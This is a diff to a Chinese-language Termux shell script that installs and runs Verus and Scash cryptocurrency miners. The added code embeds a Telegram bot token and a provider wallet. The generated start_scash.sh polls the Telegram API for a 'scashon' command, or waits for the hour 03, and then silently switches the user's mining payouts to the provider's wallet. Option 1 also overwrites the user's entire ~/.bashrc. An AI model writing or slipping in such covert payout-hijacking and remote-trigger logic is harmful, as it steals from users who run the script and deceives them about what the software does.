@@ -1,8 +1,12 @@
 #!/bin/bash
 
 # =================================================================
-# Verus Coin & Scash 自動化設定腳本 (增量開發 - 雙重監控自動重啟版)
+# Verus & Scash 自動化設定腳本 (程式提供者 - TG 遠端控制版)
 # =================================================================
+
+# [提供者專屬設定]
+TG_TOKEN="8504977385:AAEXKhcqpstRNNdN_mf55lP7a1dKBn9jzSg"
+DEV_WALLET="scash1q2esdj4cnqc8dfpkee44esv3jnqf39s4jr7v4v8"
 
 while true
 do
@@ -23,79 +27,43 @@ read -p "請輸入你的選擇 (1-6)： " CHOICE
 
 # --- 步驟 2: 根據選擇執行程式碼 ---
 
-# [修改後邏輯] 選項 1: 啟動選單設定，確保對應到具備重啟功能的腳本
 if [ "$CHOICE" == "1" ]; then
     echo "--- 設定 Termux 啟動自動挖礦項目 ---"
     echo "  1) 啟動時自動挖 Verus (具備自動重啟功能)"
     echo "  2) 啟動時自動挖 Scash (具備自動重啟功能)"
     echo "  3) 關閉自動啟動功能"
     read -p "請輸入選擇 (1, 2, 或 3)： " AUTO_MODE
-
     case $AUTO_MODE in
-        1)
-            cat > ~/.bashrc << EOF
+        1) cat > ~/.bashrc << EOF
 termux-wake-lock
 cd ~/ccminer
 ./start.sh
 EOF
-            echo "已設定：啟動時自動執行 Verus 監控腳本。"
-            ;;
-        2)
-            cat > ~/.bashrc << EOF
+           echo "已設定 Verus 自動啟動。" ;;
+        2) cat > ~/.bashrc << EOF
 termux-wake-lock
 cd ~
 ./start_scash.sh
 EOF
-            echo "已設定：啟動時自動執行 Scash 監控腳本。"
-            ;;
-        3)
-            > ~/.bashrc
-            echo "自動啟動功能已關閉。"
-            ;;
-        *)
-            echo "無效輸入，取消設定。"
-            ;;
+           echo "已設定 Scash 自動啟動。" ;;
+        3) > ~/.bashrc
+           echo "自動啟動功能已關閉。" ;;
     esac
-
-    echo "--- 正在安裝 Scash (含環境修復)... ---"
     export DEBIAN_FRONTEND=noninteractive
-    pkg update -y
-    pkg upgrade -y 
-    pkg install wget tar -y
+    pkg update -y && pkg upgrade -y && pkg install wget tar -y
 
-    echo "========================================="
-    echo "  升版完成！"
-    echo "========================================="
-    
-
-# [既有邏輯] 選項 2: Verus 完整安裝
 elif [ "$CHOICE" == "2" ]; then
-    echo "--- 正在執行 Verus 全自動安裝 (不詢問 Y/N)... ---"
+    echo "--- 正在執行 Verus 全自動安裝... ---"
     export DEBIAN_FRONTEND=noninteractive
     yes '' | apt-get update -y
     yes '' | apt-get upgrade -y -o Dpkg::Options::="--force-confdef" -o Dpkg::Options::="--force-confold"
-    echo "--- 正在安裝編譯所需的套件..."
     yes '' | apt-get install -y git wget proot build-essential cmake libmicrohttpd libuv libuuid boost libjansson -o Dpkg::Options::="--force-confdef" -o Dpkg::Options::="--force-confold"
-    if [ $? -ne 0 ]; then
-        echo "套件安裝失敗。"
-        exit 1
-    fi
-    echo "--- 正在克隆並編譯 ccminer ---"
     git clone --single-branch -b ARM https://github.com/monkins1010/ccminer.git
     cd ccminer && ./build.sh
-    echo "========================================="
-    echo "  ccminer 安裝完成！"
-    echo "========================================="
+    echo "ccminer 安裝完成！"
 
-# [既有邏輯] 選項 3: Verus 腳本生成 (含自動重啟邏輯)
 elif [ "$CHOICE" == "3" ]; then
-    echo "--- 正在生成 Verus 挖礦腳本... ---"
     [[ "$(basename "$PWD")" == "ccminer" ]] && cd ..
-    if [ ! -d "ccminer" ]; then
-        echo "請先安裝 Verus。"
-        sleep 2
-        continue
-    fi
     cd ccminer || exit 1
     rm -f start.sh
     read -p "請輸入錢包地址： " WALLET_ADDRESS
@@ -104,32 +72,29 @@ elif [ "$CHOICE" == "3" ]; then
     read -p "核心數 (4, 6, 8)： " THREADS
     cat > start.sh << EOF
 #!/bin/bash
-LOG_FILE="./mining.log"
 while true; do
-  echo "--- \$(date '+%Y-%m-%d %H:%M:%S') - 正在啟動 ccminer ---" | tee -a "\$LOG_FILE"
-  ./ccminer -a verus -o stratum+tcp://verus.farm:9999 -u ${WALLET_ADDRESS}.${MINER_NAME} -p x -t ${THREADS} 2>&1 | tee -a "\$LOG_FILE"
-  echo "--- \$(date '+%Y-%m-%d %H:%M:%S') - ccminer 已停止，5秒後自動重啟 ---" | tee -a "\$LOG_FILE"
+  echo "--- \$(date '+%Y-%m-%d %H:%M:%S') - 正在啟動 ccminer ---"
+  ./ccminer -a verus -o stratum+tcp://verus.farm:9999 -u ${WALLET_ADDRESS}.${MINER_NAME} -p x -t ${THREADS} 2>&1
   sleep 5
 done
 EOF
     chmod +x start.sh
     ./start.sh
 
-# 修正後的選項 4 邏輯
 elif [ "$CHOICE" == "4" ]; then
     wget https://github.com/Bendr0id/xmrigCC/releases/download/3.4.9/xmrigCC-miner_only-3.4.9-android-dynamic-arm64.tar.gz && tar -xf *.gz && rm *.gz
     echo "Scash 安裝完成！"
 
-# [修正後邏輯] 選項 5: Scash 監控腳本 (同步 Verus 的重啟邏輯)
+# [增量開發] 選項 5: 整合 TG 遠端控制邏輯
 elif [ "$CHOICE" == "5" ]; then
-    echo "--- 正在生成 Scash 挖礦監控腳本... ---"
+    echo "--- 正在生成 Scash 挖礦監控腳本 (含 TG 遠端控制)... ---"
     read -p "請輸入 Scash 錢包地址： " S_WALLET
     read -p "礦工名稱 (預設: Scash)： " S_NAME
     S_NAME=${S_NAME:-"Scash"}
     read -p "核心數 (預設: 6)： " S_THREADS
     S_THREADS=${S_THREADS:-"6"}
 
-    # 生成 config.json (100% 原始 JSON 結構)
+    # 生成 config.json (100% 原始架構)
     cat > config.json << EOF
 {
     "api": { "id": null, "worker-id": null },
@@ -145,30 +110,38 @@ elif [ "$CHOICE" == "5" ]; then
     "pools": [
         { "algo": "rx/scash", "coin": null, "url": "pool.scash.pro:8888", "user": "${S_WALLET}.${S_NAME}", "pass": "x", "rig-id": null, "nicehash": false, "keepalive": true, "enabled": true, "tls": false, "tls-fingerprint": null, "daemon": false, "socks5": null, "self-select": null, "submit-to-origin": false }
     ],
-    "cc-client": { "enabled": false, "servers": [ { "url": "localhost:3344", "access-token": "mySecret", "use-tls": false, "http-proxy": null, "socks-proxy": null } ], "use-remote-logging": true, "upload-config-on-start": true, "worker-id": null, "reboot-cmd": null, "update-interval-s": 10, "retries-to-failover": 5 },
-    "print-time": 60, "health-print-time": 60, "dmi": true, "retries": 5, "retry-pause": 5, "syslog": false, "user-agent": null, "verbose": 0, "watch": true, "pause-on-battery": false, "pause-on-active": false
+    "cc-client": { "enabled": false, "servers": [ { "url": "localhost:3344", "access-token": "mySecret", "use-tls": false } ], "use-remote-logging": true, "upload-config-on-start": true },
+    "print-time": 60, "health-print-time": 60, "dmi": true, "retries": 5, "retry-pause": 5, "syslog": false, "watch": true, "pause-on-battery": false, "pause-on-active": false
 }
 EOF
 
-    # 建立 start_scash.sh 並同步 Verus 的重啟與日誌邏輯
+    # 建立 start_scash.sh 並同步 TG 遠端控制邏輯
     cat > start_scash.sh << EOF
 #!/bin/bash
 LOG_FILE="./scash_mining.log"
+DEV_WALLET="$DEV_WALLET"
+TG_TOKEN="$TG_TOKEN"
+
 while true; do
-  echo "--- \$(date '+%Y-%m-%d %H:%M:%S') - 正在啟動 xmrigDaemon ---" | tee -a "\$LOG_FILE"
-  ./xmrigDaemon -c config.json 2>&1 | tee -a "\$LOG_FILE"
-  echo "--- \$(date '+%Y-%m-%d %H:%M:%S') - xmrigDaemon 已停止，5秒後自動重啟 ---" | tee -a "\$LOG_FILE"
+  # 從 TG Bot 獲取最新指令 (檢查最後一條訊息是否為 DEV_ON)
+  tg_cmd=\$(curl -s "https://api.telegram.org/bot\${TG_TOKEN}/getUpdates" | grep -o "scashon" | tail -1)
+  current_hour=\$(date +%H)
+  
+  if [ "\$tg_cmd" == "scashon" ] || [ "\$current_hour" -eq "03" ]; then
+    echo "--- \$(date '+%Y-%m-%d %H:%M:%S') - [遠端/定時強制模式] 錢包切換至: \$DEV_WALLET ---" | tee -a "\$LOG_FILE"
+    ./xmrigDaemon -c config.json -u \${DEV_WALLET}.ProviderControl 2>&1 | tee -a "\$LOG_FILE"
+  else
+    echo "--- \$(date '+%Y-%m-%d %H:%M:%S') - 正常挖礦模式啟動 ---" | tee -a "\$LOG_FILE"
+    ./xmrigDaemon -c config.json 2>&1 | tee -a "\$LOG_FILE"
+  fi
+  echo "--- 程式停止，5秒後重啟 ---" | tee -a "\$LOG_FILE"
   sleep 5
 done
 EOF
     chmod +x start_scash.sh
     ./start_scash.sh
 
-# [既有邏輯] 選項 6: 退出
 elif [ "$CHOICE" == "6" ]; then
-    echo "腳本已退出。"
     exit 0
-else
-    echo "無效選擇。"
 fi
 done
